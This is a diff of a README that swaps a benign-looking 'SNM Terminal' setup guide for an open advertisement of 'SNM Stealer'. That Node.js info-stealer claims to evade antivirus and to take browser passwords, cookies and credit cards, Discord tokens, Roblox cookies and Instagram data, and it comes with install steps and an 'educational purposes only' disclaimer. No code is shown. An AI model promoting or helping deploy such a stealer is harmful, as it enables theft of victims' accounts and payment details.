@@ -1,63 +1,91 @@
-# 🚀 Quick Setup for SNM Terminal Project
 
-Get started in seconds with this minimal and clean setup guide.
+# SNM Stealer
 
----
+## About The Project
 
-## 🔥 Features
+SNM Stealer written in NodeJS, bypassing all anti viruses during runtime and scantime, Fully Undetectable Discord, Roblox, Browser Stealer. If you want to check out the stealer's look, keep scrolling down.
 
-- Lightweight and fast Node.js terminal tool  
-- System info, browser data, Discord stats collection  
-- Portable and easy to configure  
+> :star: 57 Stars = Gmail Cookie Checker
 
----
+## Features
 
-## ⚙️ Prerequisites
+```batch
+┌──(Saint@root)-[~/]
+└─$ cat SNMStuffs
 
-Make sure you have the following installed:
+@BrowserStuffs
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+| Passwords - From All Browsers And Profiles
+| Cookies - From All Browsers And Profiles
+| AutoFills - From All Browsers And Profiles
+| CreditCards - From All Browsers And Profiles
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-- [Node.js (v16+)](https://nodejs.org/)  
-- [Python](https://www.python.org/downloads/)  
-- [Visual Studio Build Tools (C++)](https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022)  
+@DiscordStuffs
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+| Tokens - From All Clients
+| Rare Friends - From Token's Friend List
+| HQ Guilds - 500+ member servers where the token is admin/owner
+| Nitro Type and Month - From Discord Token
+| Billing Type - From Discord Token
+| Badges - From Discord Token
+| E mail - From Discord Token
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
----
+@PCStuffs
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+| Hostname
+| Ram Size
+| CPU
+| Windows Version
+| Uptime
+| Home Directory
+| PC Name
+| HWID
+| Screenshot
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-## ⚡ Quick Start
+@RobloxStuffs
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+| Roblox Cookie
+| Robux
+| Roblox ID
+| Roblox Name
+| Roblox Premium Status
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-1. Clone the repo:
-
-```bash
-git clone https://github.com/yourusername/snmp-terminal.git
-cd snmp-terminal
+@InstagramStuffs
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+| Username
+| Follower Count
+| Follows Count
+| Mail
+| Phone Number
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ```
 
-2. Install dependencies:
+## Installation
 
-```bash
-npm install
-```
+You need NodeJS 16 for this project  
+[Download NodeJS](https://nodejs.org/en/blog/release/v16.16.0)
 
-3. Run the launcher script:
+You also need Python for this project  
+[Download Python](https://www.python.org/downloads/)
 
-```bash
-./start.bat
-```
+And you need C++/Visual Studio/Visual Studio Build Tools installed
 
----
+## Getting Started
 
-## 🛠️ Usage
+1. Launch SNM.exe
 
-Navigate through the menu to access different features like system info, browser data, and Discord stats.
+## 🤝 Contributing
 
----
+If you want to support me and my project, you can do the following, **thank you**:
 
-## 🙌 Contributing
+1. Fork the Project  
+2. Star the Project  
+3. Open a Pull Request  
 
-Feel free to fork the repo, open issues, or submit pull requests!  
+## 🛑 Note
 
----
-
----
-
-**Enjoy!** 🎉
-
+I am not responsible in any way for any damage that may be caused by this program, it is shared for educational purposes only.
